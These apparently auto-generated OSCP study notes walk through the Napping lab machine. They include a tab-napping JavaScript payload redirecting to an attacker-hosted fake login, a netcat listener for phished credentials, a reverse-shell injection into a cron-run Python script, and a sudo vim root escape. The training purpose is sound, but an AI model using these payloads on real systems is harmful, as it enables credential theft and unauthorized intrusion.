This video walkthrough of the **Napping1.0.1** machine, hosted by OffSec's Siren, demonstrates a classic penetration testing flow, covering enumeration, a clever web exploit, lateral movement, and privilege escalation.

Here are the comprehensive notes, "things to know," and commands based on the walkthrough for your OSCP preparation.

## 📝 OSCP Methodology & Things to Know

The machine walkthrough emphasizes core OSCP concepts: **Thorough Enumeration**, **Insecure Direct Object Reference (IDOR) possibilities**, **Lateral Movement**, and **Sudo Privilege Escalation**.

### Key Concepts Highlighted

  * **Custom Tool Use:** While popular tools like `linpeas` exist, the guide encourages manual checks (Siren's preference) to truly understand the underlying vulnerabilities.
  * **The Power of Fuzzing:** Don't rely on just the default web page. Aggressive fuzzing with tools like **Wfuzz** or **FFuF** is crucial for discovering hidden files (`config.php`) or directories.
  * **Web Application Security:**
      * **`HttpOnly` Flag:** A session cookie missing the `HttpOnly` flag is a finding, as it allows JavaScript (e.g., from an XSS attack) to steal the cookie.
      * **Insecure Direct Object Reference (IDOR):** Always test web parameters for IDOR, especially during password resets or data retrieval, by checking if you can manipulate a `user=` or `id=` parameter to view or act on another user's behalf.
  * **Lateral Movement:** If direct privilege escalation fails, look for opportunities to pivot to another user, especially one with higher permissions, using found credentials or writable files.
  * **Linux Permissions (Groups):** Being a member of a special group (e.g., `administrators`) can grant write access to files in another user's directory, which can be abused to execute code as that user.
  * **GTFOBins:** Check the permissions of binaries you can run via `sudo -l`. Binaries like `vim`, `less`, `man`, and others can be abused for simple root shell escapes.

-----

## 💻 Essential OSCP Commands from the Walkthrough

### 1\. Enumeration & Initial Access

| Purpose | Command | Notes |
| :--- | :--- | :--- |
| **Full Nmap Scan** | `nmap -p- -sC -sV <TARGET_IP> --open` | Scans all 65,535 ports (`-p-`), runs default scripts (`-sC`), detects service versions (`-sV`), and only shows open ports (`--open`). |
| **Web Fuzzing (Directories)** | `wfuzz -c -d <WORDLIST_PATH> <TARGET_URL>/FUZZ/ --hc 404` | Fuzzes for directories (`/FUZZ/`). The `--hc 404` hides "Not Found" responses for clarity. |
| **Web Fuzzing (Files)** | `wfuzz -c -d <WORDLIST_PATH> <TARGET_URL>/FUZZ --hc 404` | Fuzzes for files (e.g., `config.php`). |
| **Netcat Listener (Phishing)** | `nc -nlvp 31337` | Listens on a custom port to capture POST data (stolen credentials) from a phishing page. |

### 2\. Tab Napping Exploitation (Theory)

The vulnerability here is the use of `target="_blank"` on a link without the **`rel="noopener noreferrer"`** attribute. This is abused via a **phishing attack** known as **Tab Napping**.

  * **Attacker HTML Payload (`offsec.html`):**
      * Includes JavaScript to hijack the original tab's URL:
        ```javascript
        if (window.opener) {
            window.opener.location.replace("http://<ATTACKER_IP>:<ATTACKER_PORT>/fakelogin");
        }
        ```
      * Hosts a fake login page that POSTs credentials to a Netcat listener on the attacker's machine.

### 3\. Lateral Movement (daniel to adrian)

| Purpose | Command | Notes |
| :--- | :--- | :--- |
| **Check Sudo Permissions** | `sudo -l` | Checks what commands the current user (`daniel`) can run as other users (like `root`). |
| **Check Cron Jobs** | `cat /etc/crontab` | Checks for any globally scheduled tasks. |
| **Check Group Membership** | `groups` | Identifies all groups the current user is a member of (e.g., `administrators`). |
| **Find DB Credentials** | `cat /var/www/html/config.php` | The source of the **adrian** user's database password. |
| **Check File Permissions/Ownership** | `ls -la /home/adrian/` | Reveals that `/home/adrian/query.pi` is writable by the `administrators` group (Daniel's group). |
| **Create Malicious Payload** | `nano /var/temp/offsec.shell` | Creates a simple reverse shell script payload in a world-writable directory. |
| **Edit `query.pi`** | `nano /home/adrian/query.pi` | Inserts the payload execution command: `import os; os.system("bash /var/temp/offsec.shell")` |
| **Netcat Listener (Reverse Shell)** | `nc -nlvp 9090` | Waits for the periodic script to run and connect back as user **adrian**. |

### 4\. Root Privilege Escalation

| Purpose | Command | Notes |
| :--- | :--- | :--- |
| **Final Sudo Check (as adrian)** | `sudo -l` | Confirms the binary that can be run as root without a password: `/usr/bin/vim`. |
| **Enter Vim as Root** | `sudo /usr/bin/vim` | Starts the `vim` editor with root privileges. |
| **Vim Escape (GTFOBins)** | `set shell=/bin/sh` <br> `:shell` | From within the Vim session, this sets the default shell to `/bin/sh` and then executes it, granting a root shell. |
| **Final Confirmation** | `id` | Confirms the successful root exploit: **`uid=0(root)`**. |
http://googleusercontent.com/youtube_content/0